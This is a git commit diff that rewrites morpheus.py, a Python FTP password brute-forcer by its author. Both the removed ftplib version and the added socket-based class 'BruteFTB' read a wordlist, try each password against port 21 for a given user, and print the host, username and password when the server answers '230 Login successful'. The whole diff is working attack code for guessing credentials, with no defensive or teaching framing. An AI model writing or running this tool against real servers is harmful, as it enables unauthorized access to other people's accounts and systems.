2b232d8b159f651d3371ca894930ff22634cfc2d
gmdutra <gabrieldmdutra@gmail.com>
2018-09-18 10:42:50 -0300

    remove dependencies, add objected oriented, add socket, supoort python 2.7

--- morpheus.py
+++ morpheus.py
@@ -1,87 +1,59 @@
 import os
 import socket
 import argparse
-
-from ftplib import FTP 
 from sys import exit
-from termcolor import colored
 
-def banner():
-    print('''
-
-
-███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗███████╗██╗   ██╗███████╗
-████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝██║   ██║██╔════╝
-██╔████╔██║██║   ██║██████╔╝██████╔╝███████║█████╗  ██║   ██║███████╗
-██║╚██╔╝██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║██╔══╝  ██║   ██║╚════██║
-██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║███████╗╚██████╔╝███████║
-╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝
-                                                                     
-                                              
-[+]Developer    - Gabriel Dutra(CoolRoot)
-[+]Linkedin     - linkedin.com/in/gmdutra
-[+]Telegram     - @gmdutra
-    ''')
-
-def check(host, username, passwd, timeout):
-
-    try:
-        ftp = FTP(host, timeout=timeout)
-        ftp.login(username, passwd)
-        print_result(host, username, passwd)
+class BruteFTB(object):
+    def __init__(self, host, user, wordlist):
+        self.user = user
+        self.host = host
+        self.wordlist = wordlist
+    
+    def Checkout(self):
         
-    except:
-        print (colored("[+]user={0}\tpass={1}\tfailed".format(username, \
-                                                        passwd), 'red'))
-
-def loadWordlist(host, username, wordlist, timeout):
-
-    try:
-        wd = open(wordlist, "r")
-        read = wd.readlines()
+        with open(self.wordlist, "r") as wordlist:
+            read = wordlist.readlines()
         
-        for line in read:
-            line = line.strip()
-            check(host, username, line, timeout)
-    except:
-        print("Nao foi possivel abrir o arquivo")
+            for line in read:
+                sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sc.connect((self.host, 21))
+                sc.recv(1024)
 
-def print_result(host, username, passwd):
+                sc.send("USER {0}\r\n".format(self.user))
+                sc.recv(1024)
+                sc.send("PASS {0}\r\n".format(line.strip()))
+                
+                r = sc.recv(1024)
+                sc.send("QUIT\r\n")
 
-    print (colored('''
--------------------------------------------
-            Login successful
--------------------------------------------
-[+]Host     = {0}                       
-[+]Username = {1}                   
-[+]Password = {2}                     
--------------------------------------------
-        '''.format(host, username, passwd), 'green'))
-        
+                if "230 Login successful" in r:
+                    print("----------Successful----------")
+                    print("Target: {0}".format(self.host))
+                    print("Username: {0}".format(self.user))
+                    print("Password: {0}".format(line.strip()))
+                    print("------------------------------")
+                    exit(0)
+
 def main():
 
     parser = argparse.ArgumentParser(add_help=False)
-    parser.add_argument("--target", "-t",    action="store", dest="host",\
+    parser.add_argument('--host',     action="store", dest="host",\
                           required=True)
    
-    parser.add_argument("--user", "-u",     action="store", dest="user",\
+    parser.add_argument("--user",     action="store", dest="user",\
                           required=True)
    
-    parser.add_argument("--wordlist", "-w",  action="store", dest="wordlist",\
+    parser.add_argument("--wordlist", action="store", dest="wordlist",\
                           required=True)
-
-    parser.add_argument("--timeout",        action="store", dest="timeout",\
-                        default=0.5, required=False)
 
     given_args = parser.parse_args()
 
     host     = given_args.host
     user     = given_args.user
     wordlist = given_args.wordlist
-    timeout  = given_args.timeout
 
-    loadWordlist(host, user, wordlist, timeout)
+    FTP = BruteFTB(host, user, wordlist)
+    FTP.Checkout()
 
-if __name__ == '__main__':
-    banner()
+if __name__=='__main__':
     main()
